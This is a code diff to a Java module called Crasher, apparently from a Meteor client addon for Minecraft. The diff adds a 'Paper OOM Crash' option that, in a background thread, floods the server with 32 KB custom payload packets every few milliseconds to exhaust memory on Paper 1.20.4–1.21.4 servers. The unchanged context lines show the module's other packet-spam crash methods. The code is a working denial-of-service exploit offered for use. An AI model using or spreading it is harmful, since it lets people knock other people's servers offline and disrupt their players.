@@ -1,14 +1,17 @@
 package com.x310.clarity.modules;
 
 import com.x310.clarity.Main;
+import com.x310.clarity.utils.payload.PaperCustomPayload;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
+import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
 import net.minecraft.network.packet.c2s.play.*;
 import net.minecraft.recipe.NetworkRecipeId;
+
 import java.util.Random;
 
 public class Crasher extends Module {
@@ -16,6 +19,7 @@ public class Crasher extends Module {
     private final SettingGroup sgSpam = settings.createGroup("Paper Skill Crash");
     private final SettingGroup sgPos = settings.createGroup("Position Spammer");
     private final SettingGroup sgVelocity = settings.createGroup("Velocity Crash");
+    private final SettingGroup oomPaper = settings.createGroup("Paper OOM Crash");
     private final SettingGroup sgDev = settings.createGroup("dev");
 
     private final Setting<Boolean> disableOnLeave = sgGeneral.add(new BoolSetting.Builder()
@@ -99,11 +103,32 @@ public class Crasher extends Module {
         .build()
     );
 
+    private final Setting<Boolean> paperOOMCrash = oomPaper.add(new BoolSetting.Builder()
+        .name("Toggle")
+        .description("Spam payload to trigger OutOfMemory for Paper (1.20.4 - 1.21.4).")
+        .defaultValue(false)
+        .build()
+    );
 
+    private final Setting<Integer> paperOOMInterval = oomPaper.add(new IntSetting.Builder()
+        .name("Amount")
+        .description("Time in ms until next payload is sent.")
+        .defaultValue(2)
+        .min(1)
+        .max(1000)
+        .sliderMax(1000)
+        .build()
+    );
+
+    private Thread oomThread;
+    private volatile boolean oomThreadRunning = false;
 
     @EventHandler
     private void onGameLeft(GameLeftEvent event) {
-        if (disableOnLeave.get()) toggle();
+        if (disableOnLeave.get()) {
+            toggle();
+            stopOomThread();
+        }
     }
 
     @EventHandler
@@ -145,7 +170,43 @@ public class Crasher extends Module {
                 handler.sendPacket(new RecipeBookDataC2SPacket(networkRecipeId));
             }
         }
+    }
 
+    @Override
+    public void onActivate() {
+        if (paperOOMCrash.get() && oomThread == null) {
+            oomThreadRunning = true;
+            oomThread = new Thread(() -> {
+                ClientPlayNetworkHandler handler;
+                if (mc.player != null && (handler = mc.getNetworkHandler()) != null) {
+                    CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
+                        new PaperCustomPayload(
+                            new byte[32000])
+                    );
+                    while (oomThreadRunning) {
+                        try {
+                            handler.sendPacket(packet);
+                            Thread.sleep(paperOOMInterval.get());
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }
+            });
+            oomThread.setName("PaperOOMCrash-Thread");
+            oomThread.setDaemon(true);
+            oomThread.start();
+        }
+    }
+
+    @Override
+    public void onDeactivate() {
+        stopOomThread();
+    }
+
+    private void stopOomThread() {
+        oomThreadRunning = false;
+        oomThread = null;
     }
 
     public Crasher() {
